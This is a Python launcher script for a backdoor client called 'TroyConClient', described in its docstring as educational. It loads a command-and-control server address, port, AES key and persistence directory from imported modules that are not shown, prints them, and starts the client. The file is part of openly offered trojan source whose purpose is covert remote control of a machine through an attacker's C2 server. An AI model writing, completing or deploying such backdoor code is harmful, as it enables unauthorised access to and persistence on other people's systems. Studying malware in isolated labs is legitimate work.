from modules import TroyConClient
from modules import  ( SERVER_IP_ADDR, SERVER_PORT_NUM, AES_ENCRYPTION_KEY,TEST_DIRECTORY ,CURRENT_SCRIPT_DIR )

# -------------------- Script Execution Entry Point --------------------
def main():
    """
    The TroyConClient class is used to initialize and run the backdoor client.
    This program was created for educational purposes.
    """

    print(TEST_DIRECTORY,CURRENT_SCRIPT_DIR)

    print(f"--- TrojanClient Educational Configuration ---")
    print(f"C2 Server: {SERVER_IP_ADDR}:{SERVER_PORT_NUM}")
    print(f"AES Key: {AES_ENCRYPTION_KEY.hex()} (Hex)")
    print(f"Working Directory: {TEST_DIRECTORY}")
    print(f"-----------------------------------------------")

    TroyCon = TroyConClient(SERVER_IP_ADDR, SERVER_PORT_NUM, AES_ENCRYPTION_KEY,
                          test_dir=TEST_DIRECTORY, persistence_dir=TEST_DIRECTORY)
    TroyCon.start_client()

if __name__ == "__main__":
    main()